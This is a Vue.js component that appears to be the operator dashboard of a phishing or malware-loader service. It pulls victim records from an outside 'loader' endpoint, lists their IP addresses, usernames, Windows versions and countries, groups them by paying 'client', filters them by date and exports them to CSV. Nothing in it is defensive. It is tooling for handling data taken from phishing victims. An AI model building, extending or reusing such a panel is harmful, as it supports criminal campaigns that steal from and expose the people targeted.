<template>
  <div>
    <!-- Выбор клиента -->
    <v-row class="mb-2">
      <v-col>
        <v-select
            label="Выберите клиента"
            :items="uniqueClients"
            item-text="name"
            item-value="_id"
            v-model="selectedClientId"
        ></v-select>
      </v-col>
    </v-row>

    <!-- Остальные компоненты (дата, кнопки и т.д.) -->
    <v-row align="center" class="mb-2">
      <v-col cols="12" sm="4">
        <v-menu v-model="menu" :close-on-content-click="false" :nudge-right="40" transition="scale-transition" offset-y min-width="290px">
          <template #activator="{ on, attrs }">
            <v-text-field v-model="dateRange.start" label="Start date" prepend-icon="mdi-calendar" readonly v-bind="attrs" v-on="on"></v-text-field>
          </template>
          <v-date-picker v-model="dateRange.start" @input="menu = false"></v-date-picker>
        </v-menu>
      </v-col>

      <v-col cols="12" sm="4">
        <v-menu v-model="menu2" :close-on-content-click="false" :nudge-right="40" transition="scale-transition" offset-y min-width="290px">
          <template #activator="{ on, attrs }">
            <v-text-field v-model="dateRange.end" label="End date" prepend-icon="mdi-calendar" readonly v-bind="attrs" v-on="on"></v-text-field>
          </template>
          <v-date-picker v-model="dateRange.end" @input="menu2 = false"></v-date-picker>
        </v-menu>
      </v-col>

      <v-col cols="12" sm="4">
        <v-btn color="primary" class="mr-2" @click="setToday">Today</v-btn>
        <v-btn color="primary" class="ml-2 mr-2" @click="refreshData">Refresh</v-btn>
        <v-btn color="primary" class="ml-2" @click="exportToCSV">Export</v-btn>
      </v-col>
    </v-row>

    <v-data-table
        :headers="headers"
        :items="filteredData"
        :items-per-page="5"
        class="elevation-1"
        show-select
        item-key="_id"
        v-model="selected"
    >
      <template v-slot:[`item.country`]="{ item }">
        <span :class="`fi fi-${item.country.toLowerCase()} `"></span>
      </template>
    </v-data-table>
  </div>
</template>

<script>
import Papa from 'papaparse';
import axios from 'axios';

export default {
  props: {
    phishingData: {
      type: Array,
      required: true,
    },
  },
  data: () => ({
    headers: [
      { text: 'ID', value: '_id' },
      { text: 'Date', value: 'time' },
      { text: 'Time', value: 'nowtime'},
      { text: 'Country', value: 'country' },
      { text: 'IP', value: 'address' },
      { text: 'Username', value: 'username'},
      { text: 'Windows', value: 'windows'}
    ],
    dateRange: {
      start: null,
      end: null,
    },
    menu: false,
    menu2: false,
    selected: [],
    localPhishingData: [],
    selectedClientId: null
  }),
  mounted() {
    this.refreshData();
  },
  methods: {
    parseDate(input) {
      let parts = input.split('-');
      return new Date(parts[0], parts[1] - 1, parts[2]);
    },
    setToday() {
      let today = new Date().toISOString().substr(0, 10);
      this.dateRange.start = today;
      this.dateRange.end = today;
    },
    exportToCSV() {
      const selectedData = this.selected;

      if (selectedData.length === 0) {
        alert('No data selected for export.');
        return;
      }

      const csvData = Papa.unparse(selectedData);
      const csvBlob = new Blob([csvData], { type: 'text/csv;charset=utf-8;' });
      const csvUrl = window.URL.createObjectURL(csvBlob);

      const downloadLink = document.createElement('a');
      downloadLink.href = csvUrl;
      downloadLink.setAttribute('download', 'exported_data.csv');
      document.body.appendChild(downloadLink);
      downloadLink.click();
      document.body.removeChild(downloadLink);
    },
    async refreshData() {
      try {
        const response = await axios.get('https://add.pearpanel.info/give/loader');

        if(response.status === 200) {
          this.localPhishingData = response.data;
        } else {
          console.error('Server responded with status: ', response.status);
        }
      } catch(error) {
        console.error('Error refreshing data: ', error);
      }
    },
  },
  computed: {
    uniqueClients() {
      const clientSet = new Set();
      this.localPhishingData.forEach(item => clientSet.add(item.client));

      return Array.from(clientSet).map((clientId, index) => ({
        _id: clientId,
        name: `Service ${index + 1} - ${clientId}`
      }));
    },

    filteredData() {
      let filteredByDateData = this.localPhishingData;

      if (this.dateRange.start && this.dateRange.end) {
        let startDate = this.parseDate(this.dateRange.start);
        let endDate = this.parseDate(this.dateRange.end);
        endDate.setDate(endDate.getDate() + 1);

        filteredByDateData = this.localPhishingData.filter(item => {
          let itemDateParts = item.time.split(".");
          let itemDate = new Date(itemDateParts[2], itemDateParts[1] - 1, itemDateParts[0]);
          return itemDate >= startDate && itemDate < endDate;
        });
      }

      if (this.selectedClientId) {
        return filteredByDateData.filter(item => item.client === this.selectedClientId);
      }
      return filteredByDateData;
    },
  },
};
</script>
